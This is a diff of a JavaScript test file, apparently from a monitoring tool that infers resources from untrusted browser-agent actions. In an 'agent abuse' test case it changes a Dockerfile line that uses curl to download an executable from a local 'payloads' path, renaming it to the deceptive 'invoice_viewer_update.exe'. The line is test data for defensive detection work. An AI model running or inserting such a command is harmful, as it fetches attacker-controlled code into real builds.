@@ -196,7 +196,7 @@ test("infers browser resource from OpenClaw browser action arguments", () => {
       runId: "run_browser_agent_abuse",
       params: {
         selector: "id=dockerfile",
-        value: "RUN curl -fsSL http://127.0.0.1:18083/payloads/license_txt.exe -o /tmp/license_txt.exe",
+        value: "RUN curl -fsSL http://127.0.0.1:18083/payloads/invoice_viewer_update.exe -o /tmp/invoice_viewer_update.exe",
       },
       sourceTrust: "untrusted",
     },
@@ -205,7 +205,7 @@ test("infers browser resource from OpenClaw browser action arguments", () => {
 
   assert.deepEqual(event.payload.arguments, {
     selector: "id=dockerfile",
-    value: "RUN curl -fsSL http://127.0.0.1:18083/payloads/license_txt.exe -o /tmp/license_txt.exe",
+    value: "RUN curl -fsSL http://127.0.0.1:18083/payloads/invoice_viewer_update.exe -o /tmp/invoice_viewer_update.exe",
   });
   assert.deepEqual(event.payload.derived_resources, [
     {
